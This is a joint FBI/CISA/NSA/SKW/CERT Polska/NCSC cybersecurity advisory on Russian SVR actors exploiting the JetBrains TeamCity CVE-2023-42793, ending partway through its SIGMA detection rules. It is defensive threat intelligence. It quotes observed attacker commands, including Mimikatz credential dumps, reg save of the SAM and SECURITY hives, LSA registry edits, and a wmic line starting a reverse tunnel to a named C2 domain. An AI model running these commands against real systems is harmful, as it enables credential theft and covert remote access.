{
  "markdown": "  \n \n \n \n \n   \n \nU.S. organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Adviso ry, \ncontact your local FBI field office  or CISAs 24/ 7 Operations Center at Report@cisa.gov  or (888) 282 -0870. When available, \nplease include the following information regarding the incident: date, time, and location of the incident; type of activity; \nnumber of people a ffected; type of equipment used for the activity; the name of the submitting company or organization; and \na designated point of contact. SLTT organizations should report incidents to MS -ISAC (866 -787-4722 or \nSOC@cis ecurity.org ). \nThis document is marked TLP:CLEAR. Disclosure is not limited. Sources may use TLP:CLEAR when information carries \nminimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release. Subject to \nstandard copyright rules, TLP:CLEAR information may be distributed without restrictions. For more information on the Traffic \nLight Protocol, see cisa.gov/tlp/ . Product ID: AA23 -347A  \n December 1 3, 2023  Co-Authored by:  TLP:CLEAR  \nRussian Foreign Intelligence Service (SVR) \nExploiting  JetBrains TeamCity CVE Global ly \nSUMMARY  \nThe U.S. Federal Bureau of Investigation (FBI), U .S. Cybersecurity & Infrastructure Security Agency \n(CISA), U.S. National Security Agency (NSA), Polish Military C ounterintelligence Service (SKW) , \nCERT Polska (CERT .PL), and the UK s National Cyber Security Centre (NCSC)  assess Russian \nForeign Intelligence Service (SVR) cyber actors also known as Advanced Persistent Threat 29 (APT \n29), the Dukes, CozyBear, and NOBELI UM/Midnight Blizzard are exploiting  CVE-2023 -42793  at a \nlarge scale, targeting servers hosting JetBrains TeamCity software since September 2023.  \nSoftware developers use TeamCity software to ma nage and automate software compilation, building, \ntesting, and releasing. If compromised, access to a TeamCity server would provide malicious actors \nwith access to that software developers source code, signing certificates, and the ability to subvert \nsoftware compilation and deployment processes access a malicious actor could further use to \nconduct supply chain operations. Although the SVR used  such access to compromise SolarWinds  \nand its customers in 2020, limited number and seemingly opportunistic types of victims  currently \nidentified, indicate that the SVR has not used  the access afforded by the TeamCity CVE in a similar \nmanner. The SVR has, however, been observed using the initial access gleaned by exploiting the \nTeamCity CVE to escalate its privileges,  move laterally, deploy additional backdoors, and take other \nsteps to ensure persistent and long -term access to the compromised network environments.  \nTo bring Russias actions to public attention, the authoring agencies are providing information on the \nSVRs most recent compromise to aid organizations in conducting their own investigations and \nsecuring their networks, provide compromised entities with actionable indicators of compromise \n(IOCs ), and empower private sector cybersecurity companies to better de tect and counter the SVRs \nmalicious actions. The authoring agencies  recommend all organizations with affected systems that \ndid not immediately apply available patches or workarounds to assume compromise and initiate threat \nhunting activities using the IOC s provided in this CSA. If potential compromise is detected, \nadministrators should apply the incident response recommendations included in this CSA and report \nkey findings to the FBI and CISA.  \n\n \n  International Partnership  \nPage 2 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  For a downloadable copy of IOCs, see:  \n AA23 -347A  (STIX XML, 77KB) \n AA23 -347A  (STIX JSON, 70KB) \nTHREAT  OVERVIEW  \nSVR cyber operations pose a persistent threat to public and private organizations networks globally. \nSince 2013, cybersecurity companies and governments have reported on SVR operations targeting \nvictim networks to steal confidential and proprietary information. A decade later, the authoring \nagencies can infer a long -term targeting pattern aimed at collecting, and enabling the collection of, \nforeign intelligence, a broad concept that for Russia encompasses informatio n on the politics, \neconomics, and military of foreign states; science and technology; and foreign counterintelligence. \nThe SVR also conducts cyber operations targeting technology companies that enable future cyber \noperations.  \nA decade ago, public reports about SVR cyber activity focused largely on the SVRs spearphishing \noperations, targeting government agencies, think tanks and policy analysis organizations, educational \ninstitutions, and political organizations. This category of targeting is consistent wit h the SVRs \nresponsibility to collect political intelligence, the collection of which has long been the SVRs highest \npriority. For the Russian Government, political intelligence includes not only the development and \nexecution of foreign policies, but also  the development and execution of domestic policies and the \npolitical processes that drive them. In December 2016, the U.S. Government published a Joint \nAnalysis Report titled GRIZZLY STEPPE  Russian Malicious Cyber Activity, which describes the \nSVRs c ompromise of a U.S. political party leading up to a presidential election. The SVRs use of \nspear phishing operations are visible today in its ongoing Diplomatic Orbiter campaign, primarily \ntargeting diplomatic agencies.  In 2023, SKW and CERT.PL published a Joint Analysis Report \ndescribing tools and techniques used by the SVR to target embassies in dozens of countries . \nLess frequently, reporting on SVR cyber activity has addressed other aspects of the SVRs foreign \nintelligence collection mission. In July 2 020, U.S., U.K., and Canadian Governments jointly published \nan advisory revealing the SVRs exploitation of CVEs to gain initial access to networks, and its \ndeployment of custom malware known as WellMess, WellMail, and Sorefang to target organizations \ninvolved in COVID -19 vaccine development. Although  not listed in  the 2020 advisory, the authoring \nagencies can now disclose that the SVRs WellMess campaign also targeted energy companies. \nSuch biomedical and energy targets are consistent with the SVRs respon sibility to support the \nRussian economy by pursuing two categories of foreign intelligence known as economic intelligence \nand science and technology.  \nIn April 2021, the U.S. Government  attributed a supply chain operation targeting the SolarWinds \ninformatio n technology company and its customers to the SVR. This attribution marked the discovery \nthat the SVR had, since at least 2018, expanded the range of its cyber operations to include the \nwidespread targeting of information technology companies. At least som e of this targeting was aimed \nat enabling additional cyber operations. Following this attribution, the U.S. and U .K. Governments \npublished advisories highlighting additional SVR TTPs, including its exploitation of various CVEs, the \n\n \n  International Partnership  \nPage 3 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  SVRs use of low and sl ow password spraying techniques to gain initial access to some victims \nnetworks, exploitation of a zero -day exploit, and exploitation of Microsoft 365 cloud environments.  \nIn this newly attributed operation targeting networks hosting TeamCity servers, the  SVR demonstrably \ncontinues its practice of targeting technology companies. By choosing to exploit CVE -2023 -42793, a \nsoftware development program, the authoring agencies assess the SVR could benefit from access to \nvictims, particularly by allowing the thre at actors to compromise the networks of dozens of software \ndevelopers. JetBrains issued a patch for this CVE in mid -September 2023, limiting the SVRs \noperation to the exploitation of unpatched, Internet -reachable TeamCity servers. While the authoring \nagen cies assess the SVR has not yet used its accesses to software developers to access customer \nnetworks and is likely still in the preparatory phase of its operation, having access to these \ncompanies networks presents the SVR with opportunities to enable har d-to- detect command and \ncontrol (C2) infrastructure.  \nTECHNICAL DETAILS  \nNote:  This advisory uses the MITRE ATT&CK for Enterprise  framework, version 14. See the MITRE \nATT&CK Tactics  and Techniques  section for a table of the threat actors activity mapped to MITRE \nATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE \nATT&CK framework, see CISA and MITRE ATT&CKs Best Practices for MITRE ATT&CK Mapping  \nand CISAs Decider Tool . While SVR followed a similar playbook in each compromise, they also \nadjusted t o each operating environment and not all presented steps or actions below were executed \non every host.  \nInitial Access - Exploitation  \nThe SVR started to exploit Internet -connected JetBrains TeamCity servers [T1190 ] in late September \n2023 using CVE -2023 -42793, which enables the insecure handling of specific paths allowing for \nbypassing authorization, resulting in arbitrary code execution on the server. The authoring  agenc ies \nobservations  show that the TeamCity exploitation usually resulted in code execution [T1203 ] with high \nprivileges granting the SVR an advantageous foothold in the network environment. The authoring  \nagencies are not currently aware of any other initial access vector to JetBrains TeamCity currently \nbeing exploited by the SVR.  \nHost Reconnaissance  \nInitial observations show the SVR used the following basic, built -in commands to perform host \nreconnaissanc e [T1033 ],[T1059.003 ],[T1592.002 ]: \n whoami /priv  \n whoami /all  \n whoami /groups  \n whoami /domain  \n nltest -dclist  \n nltest -dsgetdc  \n tasklist  \n netstat  \n\n \n  International Partnership  \nPage 4 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR   wmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\"\" /password:\"\"<redacted>\"\" process list brief  \n wmic /node:\"\"<redacted>\"\" process list brief  \n wmic process g et commandline -all \n wmic process <proc_id> get commandline  \n wmic process where name=\"\"GoogleCrashHandler64.exe\"\" get commandline,processed  \n powershell ([adsisearcher]\"((samaccountname=<redacted>))\").Findall().Properties  \n powershell ([adsisearcher]\"((samaccoun tname=<redacted>))\").Findall().Properties.memberof  \n powershell Get -WmiObject -Class Win32_Service -Computername  \n powershell Get -WindowsDriver -Online -All \nFile Exfiltration  \nAdditionally, the authoring agencies have observed the SVR exfiltrating files [T1041 ] which may \nprovide insight into the host systems operating system:  \n C:\\Windows \\system32 \\ntoskrnl.exe to precisely identify system version, likely as a prerequisite \nto deploy EDRSandBla st. \n SQL Server executable files - based on the review of the post exploitation actions, the SVR \nshowed an interest in specific files of the SQL Server installed on the compromised systems:  \n C:\\Program Files \\Microsoft SQL \nServer \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\sqlmin.dll,  \n C:\\Program Files \\Microsoft SQL \nServer \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\sqllos.dll,  \n C:\\Program Files \\Microsoft SQL \nServer \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\sqllang.dll,  \n C:\\Program Files \\Microsoft SQL \nServer \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\sqltses.dl l \n C:\\Program Files \\Microsoft SQL \nServer \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\secforwarder.dll  \n Visual Studio files  based on the review of the post exploitation actions, the SVR showed an \ninterest in specific files of the Visual Studio:  \n C:\\Program Files (x86) \\Microsoft Visual \nStudio \\2017 \\SQL\\Common7 \\IDE\\VSIXAutoUpdate.exe  \n Update management agent files  based on the review of the post exploitation actions, the \nSVR showed an interest in executables and configuration of patch management software:  \no C:\\Program Files ( x86)\\PatchManagementInstallation \\Agent \\12\\Httpd \\bin\\httpd.exe  \no C:\\Program Files (x86) \\PatchManagementInstallation \\Agent \\12\\Httpd  \no C:\\ProgramData \\GFI\\LanGuard 12 \\HttpdConfig \\httpd.conf  \nInterest in SQL Server  \nBased on the review of the exploitation, the SVR al so showed an interest in details of the SQL Server \n[T1059.001 ],[T1505.001 ]: \n powershell Compress -Archive -Path \"C: \\Program Files \\Microsoft SQL \nServer \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\sqlmin.dll\",\"C: \\Program Files \\Microsoft SQL \n\n \n  International Partnership  \nPage 5 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  Server \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\sqllos.dll\",\"C: \\Program Files \\Microsoft SQL \nServer \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\sqllang.dll\",\"C: \\Program Files \\Microsoft SQL \nServer \\MSSQL14.MSSQLSERVER \\MSSQL \\Binn\\sqltses.dll\" -DestinationPath \nC:\\Windows \\temp \\1\\sql.zip  \n SVR cyber actors  also exfiltrated secforwarder.dll  \nTactics Used to Avoid Detection  \nTo avoid detection, the SVR used a Bring Your Own  Vulnerable Driver [T1068 ] technique to disable \nor outright kill endpoint detection and response (EDR) and antivirus (AV) software  [T1562.001 ]. \nThis was done using an open source project called EDRSandBlast. The authoring agencies have \nobserved the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is \nused for controlling and pro tecting running processes and protecting them from infection. The actors \nthen inject code into AV/EDR processes for a small subset of victims [T1068 ]. Additionally, \nexecutables that ar e likely to be detected (i.e. Mimikatz) were executed in memory [T1003.001 ]. \nIn several cases , SVR attempted to hide their backdoors via:  \n Abusing a DLL hijacking vulnerability in Za bbix software by replacing a legitimate Zabbix DLL \nwith their one containing GraphicalProton backdoor,  \n Backdooring an open source application developed by Microsoft named vcperf. SVR modified \nand copied publicly available source  code. After execution, back doored vcperf dropped \nseveral DLLs to disc, one of those being a GraphicalProton backdoor,  \n Abusing a DLL hijacking vulnerability in Webroot antivirus software by replacing a legitimate \nDLL with one containing GraphicalProton backdoor.  \nTo avoid detection by  network monitoring, the SVR devised a covert C2 channel that used Microsoft \nOneDrive and Dropbox cloud services. To further enable obfuscation, data exchanged with malware \nvia OneDrive and Dropbox were hidden inside randomly generated BMP files [T1564 ], illustrated \nbelow:  \n \nPrivilege Escalation  \nTo facilitate privilege escalation [T1098 ], the SVR used multiple techniqu es, including WinPEAS, \nNoLMHash  registry key modification, and the Mimikatz tool.  \nThe SVR modified the NoLMHash registry using the following reg command:  \n reg add HKEY_LOCAL_MACHINE \\SYSTEM \\CurrentControlSet \\Control \\Lsa /v NoLMHash  /t \nREG_DWORD /d \"0\" /f  \n\n\n \n  International Partnership  \nPage 6 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  The SVR used the following Mimikatz commands [T1003 ]: \n privilege::debug  \n lsadump::cache  \n lsadump::secrets  \n lsadump::sam  \n sekurlsa::logonpasswords  \nPersistence  \nThe SVR relied on scheduled tasks [T1053.005 ] to secure persistent execution of backdoors. \nDepending on the privileges the SVR had, their executables were stored in one of following \ndirectories:  \n C:\\Windows \\temp  \n C:\\Windows \\System32  \n C:\\Windows \\WinStore  \nThe SVR made all modifications using the schtasks.exe binary. It then had multiple variants of \narguments passed to schtasks.exe, which can be found in Appendix B  Indicators of \nCompromise . \nTo secure long -term access to t he environment, the SVR used the Rubeus toolkit to craft Ticket \nGranting Tickets (TGTs) [T1558.001 ]. \nSensitive Data Exfiltration  [T1020 ] \nThe SVR exfiltrated the following Windows Registry hives from its victims [T1003 ]: \n HKLM \\SYSTEM  \n HKLM \\SAM  \n HKLM \\SECURITY  \nIn order to exfiltrate Windows Re gistry, the SVR saved hives into files [T1003.002 ], packed them, and \nthen exfiltrated them using a backdoor capability. it used reg save to save SYSTEM, SAM and \nSECURITY registry  hives, and used powershell to stage .zip archives in the C: \\Windows \\Temp \\ \ndirectory.  \n reg save HKLM \\SYSTEM \"\"C: \\Windows \\temp \\1\\sy.sa\"\" /y  \n reg save HKLM \\SAM \"\"C: \\Windows \\temp \\1\\sam.sa\"\" /y  \n reg save HKLM \\SECURITY \"\"C: \\Windows \\temp \\1\\se.sa\"\" /y  \n powershell Com press -Archive -Path C: \\Windows \\temp \\1\\ -DestinationPath \nC:\\Windows \\temp \\s.zip -Force & del C: \\Windows \\temp \\1 /F /Q  \nIn a few specific cases, the SVR used the SharpChromium tool to obtain sensitive browser data such \nas session cookies, browsing history, or s aved logins.  \nSVR also used DSInternals open source tool to interact with Directory Services. DSInternals allows to \nobtain a sensitive Domain information.  \nNetwork Reconnaissance  \n\n \n  International Partnership  \nPage 7 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  After the SVR built a secure foothold and gained an awareness of a victims Tea mCity server, it then \nfocused on network reconnaissance [ T1590.004 ]. The SVR performed network reconnaissance using \na mix of built -in commands and additional tools, such as port scan ner and PowerSploit, which it \nlaunched into memory [T1046 ]. The SVR executed the following PowerSploit commands:  \n Get-NetComputer  \n Get-NetGroup  \n Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, \npwdlastset, logoncount, badpwdcount\"  \n Get-NetDiDomain  \n Get-AdUser  \n Get-DomainUser -UserName  \n Get-NetUser -PreauthNotRequire  \n Get-NetComputer | select samaccountname  \n Get-NetUser -SPN | select serviceprincipalname  \nTunneling into Compromised Environments  \nIn selected environments the SVR used an additional tool named, rr.exe a modified open source \nreverse socks tunneler named Rsockstun to establish a tunnel to the C2 infrastructure [T1572 ]. \nThe authoring agencies are aware of the following infrastructure used in conjunction with rr.exe:  \n 65.20.97 [.]203:443  \n Poetpages [.]com:8443  \nThe SVR executed Rsockstun either in memory or using the Windows Management Instr umentation \nCommand Line (WMIC) [T1047 ] utility after dropping it to disk:  \n wmic process call create \"C: \\Program Files \\Windows Defender Advanced Threat \nProtection \\Sense.exe -connect poet pages.com -pass M554 -0sddsf2@34232fsl45t31\"  \nLateral Movement  \nThe SVR used WMIC to facilitate lateral movement  [T1047 ],[T1210 ]. \n wmic /node:\"\"<redacted>\"\" /user:\"\"<redacted>\" /password:\"\"<redacted>\"\" process call create \n\"\"rundll32 C: \\Windows \\system32 \\AclNumsInvertHost.dll AclNumsInvertHost\"\"  \nThe SVR also modified DisableRestrictedAdmin key to enable remote connections  [T1210 ]. \nIt modified Registry using the following reg command:  \n reg add HKEY_LOCAL_MACHINE \\SYSTEM \\CurrentControlSet \\Control \\Lsa /v \nDisableRestrictedAdmin /t REG_DWORD /d \"0\" /f  \nAdversa ry Toolset  \nIn the course of the TeamCity operation, the SVR used multiple custom and open source available \ntools and backdoors. The following custom tools were observed in use during the operation:  \n\n \n  International Partnership  \nPage 8 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR   GraphicalProton  is a simplistic backdoor that uses OneDriv e, Dropbox, and randomly \ngenerated BMPs [T1027.001 ] to exchange data with the SVR operator.  \n After execution, GraphicalProton gathers environment information such as active TCP/UDP  \nconnections  [T1049 ], running processes  [T1049 ], as well as user, host, and domain names  \n[T1590 ]. OneDrive is used as a primary communication channel while Dropbox is treated as a \nbackup channel  [T1567 ]. API keys are hardcod ed into the malware. When communicating with \ncloud services, GraphicalProton generates a randomly named directory which is used to store \ninfection -specific BMP files - with both commands and results  [T1564.001 ]. Directory name is \nre-randomized each time the GraphicalProton process is started.  \n BMP files that were used to exchange data were generated in the following way:  \n1. Compress data using zlib,  \n2. Encrypt data using custom algorithm,  \n3. Add *** string literal to encrypted data,  \n4. Create a random BMP with random rectangle,  \n5. And finally, encode encrypted data within lower pixel bits.  \nWhile the GraphicalProton  backdoor has remained mostly unchanged over the months we have been \ntracking it, to  avoid detection the adversary wrapped the tool in various different layers of obfuscation, \nencryption, encoders, and stagers. Two specific variants of GraphicalProton packaging are \nespecially noteworthy  a variant that uses DLL hijacking [T1574.002 ] in Zabbix as a means to start \nexecution (and potentially provide long -term, hard -to-detect access) and a variant that masks itself \nwithin vcperf [T1036 ], an open -source C++ build analysis tool from Microsoft.  \n GraphicalProton HTTPS variant  a variant of GraphicalProton backdoor recently introduced \nby the SVR that forgoes using cloud -based services as a C2 channel and instead relies on \nHTTP request.  \nTo legitimize the C2 channel, SVR used a re -registered expired domain set up with dummy \nWordPress  website. Execution of HTTPS variant of GraphicalProton is split into two files  \nstager and encrypted binary file that co ntains further code.  \nMITRE ATT&CK TACTICS  AND TECHNIQUES  \nSee below tables for all referenced threat actor tactics and techniques in this advisory. For additional \nmitigations, see the Mitigations  section.  \nTable 1: SVR Cyber Actors ATT&CK Techniques for Ente rprise - Reconnaissance  \nTechnique Title  ID Use \nGather Victim Network \nInformation:  Network  Topology  T1590.004  SVR cyber actors may gather \ninformation about the victims \nnetwork  topology  that can be used \nduring targeting.  \n\n \n  International Partnership  \nPage 9 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  Gather  Victim  Host Information: \nSoftware  T1592.002  SVR cyber actors may gather \ninformation  about  the victims  host \nnetworks that can be us ed during \ntargeting.  \n \nTable 2: SVR Cyber A ctors ATT&CK T echniques for Enterprise   Initial Access  \nTechnique Title  ID Use \nExploit Public -Facing Application  T1190  SVR cyber actors exp loit internet -\nconnected JetBrains TeamCity server \nusing CVE -2023 -42793 for initial \naccess . \n \nTable 3: SVR Cyber Actors  ATT&CK Techniques for Enterprise: Execution  \nTechnique Title  ID Use \nCommand and Scripting \nInterpreter: PowerShell  T1059.001  SVR cyber actors used powershell \ncommands to compress Microsoft \nSQL server .dll files.  \nCommand and Scripting \nInterpreter: Windows Command \nShell  T1059.003  SVR cyber actors execute these \npowershell commands to perform \nhost reconnaissance:  \n powershell \n([adsisearcher]\"((samaccountn\name=<redacted>))\").Findall().P\nroperties  \n powershell \n([adsisearcher]\"((samaccountn\name=<redacted >))\").Findall().P\nroperties.memberof  \n powershell Get -WmiObject -\nClass Win32_Service -\nComputername  \n powershell Get -WindowsDriver \n-Online -All \nExploitation for Client Execution  T1203  SVR c yber actors leverage arbitrary \ncode execution after exploiting CVE -\n2023 -42793.  \n\n \n  International Partnership  \nPage 10 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  Hijack Execution Flow: DLL \nSide-Loading  T1574.002  SVR cyber actors use a variant of \nGraphicalProton that uses DLL \nhijacking in Zabbix as a means to \nstart execution.  \n \nTable 4: SVR Cyber Actors  ATT&CK Techniques for Enterprise: Persistence  \nTechnique Title  ID Use \nScheduled  Task  T1053.005  SVR cyber actors may abuse \nWindows Task Schedule to perform \ntask scheduling  for initial  or recurring \nexecution of malicious code.  \nServer Software Component: \nSQL Stored Procedures  T1505.001  SVR cyber actors abuse SQL server \nstored procedures to maintain \npersistence.  \nBoot or Logon Autostart \nExecution  T1547  SVR cyber actors used \nC:\\Windows \\system32 \\ntosk rnl.exe  \nto configure automatic system boot \nsettings to maintain persistence.  \n \nTable 5: SVR Cyber Actors  ATT&CK Techniques for Enterprise: Privilege Escalation  \nTechnique Title  ID Use \nExploitation for Privilege \nEscalation  T1068  SVR cyber actors exploit JetBrains \nTeamCity vulnerability to achieve \nescalated privileges.  \nTo avoid detection, the SVR cyber \nactors used a Bring Your Own \nVulnerable Driver technique to \ndisable EDR and AV defen se \nmechanisms.  \nAccount Manipulation  T1098  SVR cyber actors may manipulate \naccounts to maintain and/or elevate \naccess to victim systems.  \n  \n\n \n  International Partnership  \nPage 11 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  Table 6: SVR Cyber Actors  ATT&CK Techniques  for Enterprise: Defense Evasion  \nTechnique Title  ID Use \nObfuscated Files or Information: \nBinary Padding  T1027.001  SVR cyber actors use BMPs to \nperform binary padding while \nexchang e data is exfiltrated to their \nC2 station.  \nMasquerading  T1036  SVR cyber actors use a variant that \nuses DLL hijacking  in Zabbix as a \nmeans to start execution (and \npotentially provid e long -term, hard -to-\ndetect access) and a variant that \nmasks itself within vcperf, an open -\nsource C++ build analysis tool from \nMicrosoft.  \nProcess Injection  T1055  SVR cyber actors inje ct code into AV \nand EDR process es to evade \ndefenses.  \nDisable or Modify Tools  T1562.001  SVR cyber actors may modify and/or \ndisable tools to avoid possible \ndetection of their malwar e/tools and \nactivities.  \nHide Artifacts  T1564  SVR cyber actors may attempt to \nhide artifacts associated with their \nbehaviors to evade detection.  \nHide Artifacts: Hidden Files and \nDirec tories  T1564.001  When communicating with cloud \nservices, GraphicalProton  generates \na randomly named directory which is \nused to store infection -specific BMP \nfiles - with both comman ds and \nresults . \n \nTable 7: SVR Cyber actors  ATT&CK Techniques for Enterprise: Credential Access  \nTechnique Title  ID Use \nOS Credential Dumping: LSASS \nMemory  T1003.001  SVR cyber act ors executed Mimikatz \ncommands in memory to gain access \nto credentials stored in memory.  \n\n \n  International Partnership  \nPage 12 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  OS Credential Dumping: Security \nAccount Manager  T1003.002  SVR cyber actors used:  \n privilege ::debug  \n lsadump::cache  \n lsadump::secrets  \n lsadump::sam  \n sekurlsa::logonpasswords  \nMimikatz commands to gain access \nto credentials.  \nAdditionally, SVR cyber actors \nexfiltrated Windows registry hives to \nsteal credentials.  \n HKLM \\SYSTEM  \n HKLM \\SAM  \n HKLM \\SECURITY  \n \nCredentials from Password \nStores: Credentials from Web \nBrowsers  T1555.003  In a few specific cases, the SVR \nused the SharpChromium tool to \nobtain sensitive browser data such as \nsession  cookies, browsing history, or \nsaved logins . \nSteal or Forge Kerberos Tickets: \nGolden Ticket  T1558.001  To secure long -term access to the \nenvironment, the SVR used the \nRubeus toolki t to craft Ticket \nGranting Tickets (TGTs) . \n \nTable 8: SVR Cyber Actors ATT&CK Techniques for Enterprise: Discovery  \nTechnique Title  ID Use \nSystem Owner/User Discovery  T1033  SVR cyber a ctors use these built -in \ncommands to perform host \nreconnaissance: whoami /priv , \nwhoami / all, whoami / groups,  \nwhoami / domain to perform user \ndiscovery.  \nNetwork Service Discovery  T104 6 SVR cyber actors performed \nnetwork reconnaissance using a \nmix of built -in commands and \nadditional tools, such as port \nscanner and PowerSploit . \n\n \n  International Partnership  \nPage 13 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  Process Discovery  T1057  SVR cyber act ors use \nGraphicalProton to gather running \nprocesses data.  \nGather Victim Network \nInformation  T1590  SVR cyber actors use \nGraphicalProton to gather victim \nnetwork information.  \n \nTable 9:  SVR Cyber Actors ATT&CK Techniques for Enterprise: Lateral Movement  \nTechnique Title  ID Use \nExploitation  of Remote  Services  T1210  SVR cyber  actors  may exploit  remote \nservices  to gain unauthorized  access \nto internal systems once inside a \nnetwork.  \nWindows  Management \nInstrumentation  T1047  SVR cyber actors executed \nRsockstun either in memory or \nusing Windows Managemen t \nInstrumentation (WMI) to execute \nmalicious commands and \npayloads.  \nwmic process call create \n\"C:\\Program Files \\Windows \nDefender Advanced Threat \nProtection \\Sense.exe -connect \npoetpages.com -pass M554 -\n0sddsf2@34232fsl45t31\"  \n \nTable 10: SVR Cyber Actors ATT&C K Techniques for Enterprise: Command and Control  \nTechnique Title  ID Use \nDynamic Resolution  T1568  SVR may dynamically establish \nconnections to command -and-control \ninfrastructure to eva de common \ndetections and remediations.  \nProtocol  Tunneling  T1572  SVR cyber actors may tunnel \nnetwork  communications  to and \nfrom a victim system within a \nseparate protocol to avoid \ndetection/network filtering and/or \nenable access to otherwise \nunreachable systems.  \n\n \n  International Partnership  \nPage 14 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  In selected environments, the SVR \nused an additional tool named, \nrr.exe a modified open source \nreverse socks tunneler named \nRsockstun to establish a tunnel \nto the C2 infrastru cture . \n \nTable 11: SVR Cyber Actors ATT&CK Techniques for Enterprise: Exfiltration  \nTechnique Title  ID Use \nAutomated  Exfiltration  T1020  SVR cyber  actors  may exfiltrate  data, \nsuch as se nsitive documents, \nthrough the use of automated \nprocessing after being gathered \nduring collection.  \nExfiltration  Over  C2 Channel  T1041  SVR cyber actors may steal data \nby exfiltrating i t over an existing C2 \nchannel. Stolen data is encoded \ninto normal communications using \nthe same protocol as C2 \ncommunications.  \nExfiltration Over Web Service  T1567  SVR cyber actors use  OneDrive \nand Dropbox to exfiltrate data to \ntheir C2 station.  \nINDICATORS OF COMPRO MISE  \nNote: Please refer to Appendix B for a list of IOCs.  \nVICTIM TYPES  \nAs a result of this latest SVR cyber activity, the FBI, CISA, NSA, SKW , CERT Polska , and NCSC  \nhave ide ntified a few dozen compromised companies in the United States, Europe, Asia, and \nAustralia, and are aware of over a hundred compromised devices  though  we assess this list does not \nrepresent the full set of compromised organizations. Generally, the victim types do not fit into any sort \nof pattern or trend, aside from having an unpatched, Internet -reachable JetBrains TeamCity server, \nleading to the assessment that SVRs exploitation of these victims networks was opportunistic in \nnature and not necessarily a  targeted attack. Identified victims  included : an energy trade association; \ncompanies that provide software for billing, medical devices, customer care, employee monitoring, \nfinancial management, marketing, sales, and video games; as well as hosting compan ies, tools \nmanufacturers, and small and large IT companies.  \n\n \n  International Partnership  \nPage 15 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  DETECTION METHODS  \nThe following rules can be used to detect activity linked to adversary activity. These rules should \nserve as examples and adapt to each organizations environment and telemetry.  \nSIGMA rules  \nPresented SIGMA rules target identified operators behavior patterns and can be used for the threat \nhunting against collected logs.  \ntitle: Privilege information listing via whoami  \ndescription: Detects whoami.exe execution and listing of privile ges \nauthor:  \nreferences: https://learn.microsoft.com/en -us/windows -server/administration/windows -\ncommands/whoami  \ndate: 2023/11/15  \nlogsource:  \n    category: process_creation  \n    product: windows  \ndetection:  \n    selection:  \n        Image|endswith:  \n          - 'whoami.exe'  \n        CommandLine|contains:  \n          - 'priv' \n          - 'PRIV' \n    condition: selection  \nfalsepositives: legitimate use by system administrator  \n \n \ntitle: DC listing via nltest  \ndescription: Detects nltest.exe execution and DC listing  \nauthor:  \nreferences:  \ndate: 2023/11/15  \nlogsource:  \n    category: process_creation  \n    product: windows  \ndetection:  \n    selection:  \n        Image|endswith:  \n          - 'nltest.exe'  \n        CommandLine|re: '.*dclist \\:.*|.*DCLIST \\:.*|.*dsgetdc \\:.*|.*DSGETDC \\:.*' \n    condition: selection  \nfalsepositives: legitimate use by system administrator  \n \n \n \ntitle: DLL execution via WMI  \ndescription: Detects DLL execution via WMI  \nauthor:  \nreferences:  \ndate: 2023/11/15  \n\n \n  International Partnership  \nPage 16 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  logsource:  \n    category: process_creation  \n    product: windows  \ndetectio n: \n    selection:  \n        Image|endswith:  \n          - 'WMIC.exe'  \n        CommandLine|contains|all:  \n          - 'call' \n          - 'rundll32'  \n    condition: selection  \nfalsepositives: legitimate use by software or system administrator  \n \n \n \ntitle: Process with connect and pass as args  \ndescription: Process with connect and pass as args  \nauthor: \nreferences:  \ndate: 2023/11/15  \nlogsource:  \n    category: process_creation  \n    product: windows  \ndetection:  \n    selection:  \n        CommandLine|contains|all:  \n          - 'pass' \n          - 'connect'  \n    condition: selection  \nfalsepositives: legitimate use of rsockstun or software with exact same arguments  \n \n \n \ntitle: Service or Drive enumeration via powershell  \ndescription: Service or Drive enumeration via powershell  \nauthor:  \nreferences: \ndate: 2023/11/15  \nlogsource:  \n    category: ps_script  \n    product: windows  \ndetection:  \n    selection_1:  \n            ScriptBlockText|contains|all:  \n            - 'Get-WmiObject'  \n            - '-Class' \n            - 'Win32_Service'  \n    selection_2:  \n            ScriptBlockText|contains|all:  \n            - 'Get-WindowsDriver'  \n            - '-Online' \n            - '-All' \n    condition: selection_1 or selection_2  \n\n \n  International Partnership  \nPage 17 of 27  |  Product ID : AA2 3-347A   TLP:CLEAR  \n TLP:CLEAR  falsepositives: legitimate use by system administrator  \n \ntitle: Compressing files from temp to temp  \ndescription: Compressing files from temp \\ to temp used by SVR to prepare data to be \nexfiltrated  \nreferences:  \nauthor:  \ndate: 2023/11/15  \nlogsource:  \n    category: ps_script  \n    product: windows  \ndetection:  \n    selection:  \n        ScriptBlockText|re: '.*Compress \\-Archive.*Path.*Windows \\\\[Tt]{1}emp \\\\[1-\n9]{1}.*DestinationPath.*Windows 